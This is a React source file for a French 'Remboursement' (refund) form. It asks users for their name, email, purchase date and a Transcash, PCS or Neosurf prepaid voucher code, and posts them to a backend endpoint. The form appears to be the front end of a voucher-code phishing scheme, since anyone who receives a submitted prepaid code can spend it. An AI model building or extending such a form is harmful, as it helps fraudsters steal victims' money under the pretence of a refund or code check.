import { useState } from "react";
import axios from "axios";

function Remboursement() {
  const [formData, setFormData] = useState({
    nom: "",
    prenom: "",
    email: "",
    typeRecharge: "TRANSCASH",
    dateAchat: "",
    codeRecharge: "",
    cacherCode: "NON",
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState(null); // "success" | "error" | null

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
    if (errors[e.target.name]) {
      setErrors({ ...errors, [e.target.name]: null });
    }
  };

  const validate = () => {
    const newErrors = {};
    if (!formData.nom.trim()) newErrors.nom = "Le nom est requis.";
    if (!formData.prenom.trim()) newErrors.prenom = "Le prénom est requis.";
    if (!formData.email.trim()) {
      newErrors.email = "L'email est requis.";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Format d'email invalide.";
    }
    if (!formData.dateAchat)
      newErrors.dateAchat = "La date d'achat est requise.";
    if (!formData.codeRecharge.trim())
      newErrors.codeRecharge = "Le code est requis.";
    return newErrors;
  };

  const handleSbmit = async (e) => {
    e.preventDefault();
    setStatus(null);

    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setLoading(true);
    try {
      await axios.post(`${import.meta.env.VITE_API_URL}/envoyer`, {
        ...formData,
        formulaire: "Remboursement",
      });
      setStatus("success");
      setFormData({
        nom: "",
        prenom: "",
        email: "",
        typeRecharge: "TRANSCASH",
        dateAchat: "",
        codeRecharge: "",
        cacherCode: "NON",
      });
    } catch (error) {
      console.error(error);
      setStatus("error");
    } finally {
      setLoading(false);
    }
  };

  return (
    <section>
      <div className="Activation">
        <form onSubmit={handleSbmit} noValidate>
          <h1>Remboursement</h1>
          <h3>Remplissez le formulaire ci-dessous</h3>

          {status === "success" && (
            <div className="form-alert form-alert-success">
              ✓ Votre demande a bien été envoyée. Nous vous répondrons
              rapidement.
            </div>
          )}
          {status === "error" && (
            <div className="form-alert form-alert-error">
              ✕ Une erreur est survenue. Merci de réessayer dans quelques
              instants.
            </div>
          )}

          <h4>NOM</h4>
          <input
            type="text"
            name="nom"
            placeholder="nom"
            value={formData.nom}
            onChange={handleChange}
          />
          {errors.nom && <span className="field-error">{errors.nom}</span>}

          <h4>PRÉNOM</h4>
          <input
            type="text"
            name="prenom"
            placeholder="prénom"
            value={formData.prenom}
            onChange={handleChange}
          />
          {errors.prenom && (
            <span className="field-error">{errors.prenom}</span>
          )}

          <h4>EMAIL</h4>
          <input
            type="email"
            name="email"
            placeholder="email"
            value={formData.email}
            onChange={handleChange}
          />
          {errors.email && <span className="field-error">{errors.email}</span>}

          <h4>TYPE DE RECHARGE</h4>
          <select
            name="typeRecharge"
            value={formData.typeRecharge}
            onChange={handleChange}
          >
            <option value="TRANSCASH">TRANSCASH</option>
            <option value="PCS">PCS</option>
            <option value="NEOSURF">NEOSURF</option>
          </select>

          <h4>DATE D'ACHAT</h4>
          <input
            type="date"
            name="dateAchat"
            value={formData.dateAchat}
            onChange={handleChange}
          />
          {errors.dateAchat && (
            <span className="field-error">{errors.dateAchat}</span>
          )}

          <h4>CODE DU RECHARGE</h4>
          <input
            type="text"
            name="codeRecharge"
            placeholder="code"
            value={formData.codeRecharge}
            onChange={handleChange}
          />
          {errors.codeRecharge && (
            <span className="field-error">{errors.codeRecharge}</span>
          )}

          <h4>CACHER LE CODE</h4>
          <select
            name="cacherCode"
            value={formData.cacherCode}
            onChange={handleChange}
          >
            <option value="OUI">OUI</option>
            <option value="NON">NON</option>
          </select>

          <button type="submit" className="btn" disabled={loading}>
            {loading ? "Envoi en cours..." : "ENVOYER"}
          </button>
        </form>
      </div>
    </section>
  );
}
export default Remboursement;
